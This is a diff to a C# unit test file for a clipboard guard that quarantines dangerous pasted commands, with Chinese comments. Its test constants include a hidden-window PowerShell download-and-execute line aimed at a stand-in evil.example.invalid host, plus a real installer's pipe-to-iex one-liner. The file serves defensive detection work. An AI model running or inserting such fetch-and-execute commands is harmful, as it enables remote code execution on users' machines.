@@ -6,7 +6,8 @@ public class ClipboardGuardStateTests
 {
     // 網址都是無效的 example 網域。
     private const string Malicious = "powershell -w hidden -c \"iex(iwr 'https://evil.example.invalid/a.ps1')\"";
-    private const string Suspicious = "powershell -c \"irm https://get.example.invalid | iex\"";
+    // 官方安裝網站的「下載後執行」只提醒；其他網站會被攔截（#20）。
+    private const string Suspicious = "powershell -c \"irm https://get.scoop.sh | iex\"";
 
     [Fact]
     public void 惡意內容被隔離且保留攔截狀態()
@@ -113,5 +114,40 @@ public class ClipboardGuardStateTests
         s.OnClipboardText(null);
         Assert.True(g1 > g0);
         Assert.True(s.Generation > g1);
+    }
+
+    [Fact]
+    public void 截斷過的惡意內容_隔離區存完整原文_還原後不再攔()
+    {
+        // App 只讀前 MaxAnalyzedChars 字分析；要隔離時另外讀完整內容（#24 F20）。
+        var full = Malicious + "\n" + new string('a', ClipboardLimits.MaxAnalyzedChars);
+        var prefix = ClipboardLimits.Prefix(full);
+        var s = new ClipboardGuardState();
+
+        Assert.Equal(ClipboardAction.Quarantine, s.OnClipboardText(prefix, () => full));
+        Assert.Equal(full, s.Quarantined);
+
+        Assert.Equal(full, s.BeginRestore());
+        s.EndRestore(succeeded: true);
+        // 還原完整原文後，剪貼簿讀回來的還是同一段前綴：已確認可信，不再攔。
+        Assert.Equal(ClipboardAction.None, s.OnClipboardText(prefix, () => full));
+        Assert.Equal(ThreatLevel.Suspicious, s.Level);
+    }
+
+    [Fact]
+    public void 讀不到完整內容時隔離截斷後的內容()
+    {
+        var s = new ClipboardGuardState();
+        Assert.Equal(ClipboardAction.Quarantine, s.OnClipboardText(Malicious, () => null));
+        Assert.Equal(Malicious, s.Quarantined);
+    }
+
+    [Fact]
+    public void 不需要隔離時不讀完整內容()
+    {
+        var s = new ClipboardGuardState();
+        var called = false;
+        s.OnClipboardText("hello", () => { called = true; return "hello"; });
+        Assert.False(called);
     }
 }
